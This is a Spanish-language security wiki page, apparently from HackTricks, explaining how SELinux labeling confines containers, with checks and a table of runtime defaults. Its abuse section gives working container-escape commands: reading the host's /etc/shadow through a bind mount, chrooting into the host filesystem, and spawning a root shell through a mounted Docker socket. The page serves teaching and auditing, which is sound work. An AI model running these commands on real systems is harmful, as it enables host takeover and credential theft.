# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Descripción general

SELinux es un sistema de Control de Acceso Obligatorio basado en etiquetas. Cada proceso y objeto relevante puede llevar un contexto de seguridad, y la política decide qué dominios pueden interactuar con qué tipos y de qué manera. En entornos con contenedores, esto normalmente significa que el runtime inicia el proceso del contenedor bajo un dominio confinado de contenedor y etiqueta el contenido del contenedor con los tipos correspondientes. Si la política funciona correctamente, el proceso podrá leer y escribir lo que su etiqueta deba tocar mientras se le niega acceso a otro contenido del host, incluso si ese contenido se hace visible mediante un mount.

Esta es una de las protecciones del lado del host más potentes disponibles en despliegues de contenedores Linux de uso general. Es especialmente importante en Fedora, RHEL, CentOS Stream, OpenShift y otros ecosistemas centrados en SELinux. En esos entornos, un revisor que ignore SELinux a menudo malinterpretará por qué una vía que parece obvia hacia la compromisión del host está realmente bloqueada.

## AppArmor Vs SELinux

La diferencia más simple a alto nivel es que AppArmor se basa en rutas mientras que SELinux es **basado en etiquetas**. Eso tiene grandes consecuencias para la seguridad de contenedores. Una política basada en rutas puede comportarse de forma diferente si el mismo contenido del host se hace visible bajo una ruta de montaje inesperada. Una política basada en etiquetas, en cambio, pregunta cuál es la etiqueta del objeto y qué puede hacerle el dominio del proceso. Esto no hace que SELinux sea simple, pero sí lo hace robusto frente a una clase de suposiciones basadas en trucos de ruta que los defensores a veces hacen por accidente en sistemas basados en AppArmor.

Debido a que el modelo está orientado a etiquetas, el manejo de volúmenes de contenedores y las decisiones de re-etiquetado son críticas para la seguridad. Si el runtime u operador cambia las etiquetas de forma demasiado amplia para "make mounts work", el límite de la política que debía contener la carga de trabajo puede volverse mucho más débil de lo previsto.

## Laboratorio

Para comprobar si SELinux está activo en el host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Para inspeccionar las etiquetas existentes en el host:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Para comparar una ejecución normal con una en la que el etiquetado está deshabilitado:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
On an SELinux-enabled host, this is a very practical demonstration because it shows the difference between a workload running under the expected container domain and one that has been stripped of that enforcement layer.

## Uso en tiempo de ejecución

Podman está particularmente alineado con SELinux en sistemas donde SELinux forma parte de la configuración por defecto de la plataforma. Podman sin root más SELinux es una de las bases de contenedor más sólidas en mainstream porque el proceso ya es no privilegiado en el lado del host y aun así está confinado por la política MAC. Docker también puede usar SELinux donde esté soportado, aunque los administradores a veces lo desactivan para evitar fricciones con el etiquetado de volúmenes. CRI-O y OpenShift dependen mucho de SELinux como parte de su historia de aislamiento de contenedores. Kubernetes también puede exponer ajustes relacionados con SELinux, pero su valor obviamente depende de si el OS del nodo realmente soporta y aplica SELinux.

La lección recurrente es que SELinux no es un adorno opcional. En los ecosistemas construidos en torno a él, forma parte del límite de seguridad esperado.

## Misconfiguraciones

El error clásico es `label=disable`. Operativamente, esto suele ocurrir porque se denegó un mount de volumen y la respuesta más rápida a corto plazo fue eliminar SELinux de la ecuación en lugar de arreglar el modelo de etiquetado. Otro error común es el relabeling incorrecto del contenido del host. Operaciones de relabel amplias pueden hacer que la aplicación funcione, pero también pueden ampliar lo que el contenedor puede tocar mucho más allá de lo originalmente previsto.

También es importante no confundir SELinux instalado con SELinux efectivo. Un host puede soportar SELinux y aún estar en modo permissive, o el runtime puede no estar lanzando la carga de trabajo bajo el dominio esperado. En esos casos la protección es mucho más débil de lo que la documentación podría sugerir.

## Abuse

Cuando SELinux está ausente, en permissive, o ampliamente deshabilitado para la carga de trabajo, las rutas montadas del host son mucho más fáciles de abusar. El mismo bind mount que de otro modo habría sido restringido por etiquetas puede convertirse en una vía directa hacia datos del host o modificación del host. Esto es especialmente relevante cuando se combina con mounts de volúmenes escribibles, directorios del runtime del contenedor, o atajos operativos que expusieron rutas sensibles del host por conveniencia.

SELinux suele explicar por qué un writeup de breakout genérico funciona de inmediato en un host pero falla repetidamente en otro aunque las runtime flags parezcan similares. El ingrediente que falta frecuentemente no es un namespace o una capability, sino un límite de etiquetas que permaneció intacto.

The fastest practical check is to compare the active context and then probe mounted host paths or runtime directories that would normally be label-confined:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Si un host bind mount está presente y SELinux labeling ha sido deshabilitado o debilitado, la divulgación de información suele producirse primero:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Si el mount es escribible y el contenedor es efectivamente root del host desde el punto de vista del kernel, el siguiente paso es probar una modificación controlada del host en lugar de adivinar:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
En hosts con SELinux habilitado, la pérdida de etiquetas alrededor de los directorios de estado en tiempo de ejecución también puede exponer rutas directas de privilege-escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Estos comandos no sustituyen una cadena de escape completa, pero dejan muy claro rápidamente si SELinux era lo que impedía el acceso a los datos del host o la modificación de archivos en el host.

### Ejemplo completo: SELinux deshabilitado + Host montado con permisos de escritura

Si el etiquetado de SELinux está deshabilitado y el sistema de archivos del host está montado con permisos de escritura en `/host`, un escape completo al host se convierte en un caso normal de abuso de bind-mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Si el `chroot` tiene éxito, el proceso del contenedor ahora está operando desde el sistema de archivos del host:
```bash
id
hostname
cat /etc/passwd | tail
```
### Ejemplo completo: SELinux deshabilitado + Directorio en tiempo de ejecución

Si la carga de trabajo puede alcanzar un socket del runtime una vez que las etiquetas están deshabilitadas, el escape puede delegarse al runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
La observación relevante es que SELinux a menudo era el control que impedía exactamente este tipo de acceso host-path o runtime-state.

## Comprobaciones

El objetivo de las comprobaciones de SELinux es confirmar que SELinux está habilitado, identificar el contexto de seguridad actual y comprobar si los archivos o rutas que te interesan están realmente confinados por etiquetas.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Qué es interesante aquí:

- `getenforce` idealmente debería devolver `Enforcing`; `Permissive` o `Disabled` cambian el significado de toda la sección de SELinux.
- Si el contexto del proceso actual parece inesperado o demasiado amplio, la workload puede no estar ejecutándose bajo la política de contenedor prevista.
- Si los archivos montados desde el host o los directorios en tiempo de ejecución tienen etiquetas que el proceso puede acceder con demasiada facilidad, los bind mounts se vuelven mucho más peligrosos.

Al revisar un contenedor en una plataforma con soporte SELinux, no trate el etiquetado como un detalle secundario. En muchos casos es una de las principales razones por las que el host aún no está comprometido.

## Valores predeterminados en tiempo de ejecución

| Runtime / plataforma | Estado predeterminado | Comportamiento predeterminado | Debilitamiento manual común |
| --- | --- | --- | --- |
| Docker Engine | Depende del host | La separación SELinux está disponible en hosts con SELinux habilitado, pero el comportamiento exacto depende de la configuración del host/daemon | `--security-opt label=disable`, re-etiquetado amplio de bind mounts, `--privileged` |
| Podman | Comúnmente habilitado en hosts con SELinux | La separación SELinux es una parte normal de Podman en sistemas con SELinux, a menos que se desactive | `--security-opt label=disable`, `label=false` en `containers.conf`, `--privileged` |
| Kubernetes | No se asigna generalmente automáticamente a nivel de Pod | Existe soporte SELinux, pero los Pods normalmente necesitan `securityContext.seLinuxOptions` o valores predeterminados específicos de la plataforma; se requiere soporte del runtime y del nodo | valores `seLinuxOptions` débiles o amplios, ejecución en nodos `Permissive`/`Disabled`, políticas de plataforma que deshabilitan el etiquetado |
| CRI-O / OpenShift style deployments | Confiado en gran medida | SELinux suele ser una parte central del modelo de aislamiento de nodos en estos entornos | políticas personalizadas que amplían excesivamente el acceso, deshabilitar el etiquetado por compatibilidad |

Los valores predeterminados de SELinux dependen más de la distribución que los valores predeterminados de seccomp. En sistemas estilo Fedora/RHEL/OpenShift, SELinux suele ser central en el modelo de aislamiento. En sistemas sin SELinux, simplemente está ausente.
{{#include ../../../../banners/hacktricks-training.md}}
